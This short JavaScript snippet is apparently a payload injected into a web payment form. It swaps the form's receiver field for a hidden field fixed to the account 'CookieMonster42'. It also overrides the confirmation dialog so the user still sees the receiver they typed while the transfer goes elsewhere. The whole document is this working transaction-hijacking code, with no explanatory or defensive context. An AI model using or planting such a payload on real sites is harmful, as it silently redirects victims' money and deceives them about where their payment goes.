
  let realReceiverInput = document.getElementById('receiverInput')
  let hiddenReceiverInput = document.createElement('input');
  
  hiddenReceiverInput.type = 'hidden'; 
  hiddenReceiverInput.id = realReceiverInput.id
  realReceiverInput.id += 'real'
  hiddenReceiverInput.value = 'CookieMonster42'; 
  
  document.querySelector('.form-container').appendChild(hiddenReceiverInput);


showConfirmationModal = function() {
  let sender = document.getElementById("senderInput").value;
  let receiver = document.getElementById("receiverInputreal").value;
  let amount = document.getElementById("amountInput").value;

  let details = `Sender: ${sender}\nReceiver: ${receiver}\nAmount: $${amount}`;

  document.getElementById('transactionDetails').innerText = details;
  document.getElementById('transactionModal').style.display = 'block';
}



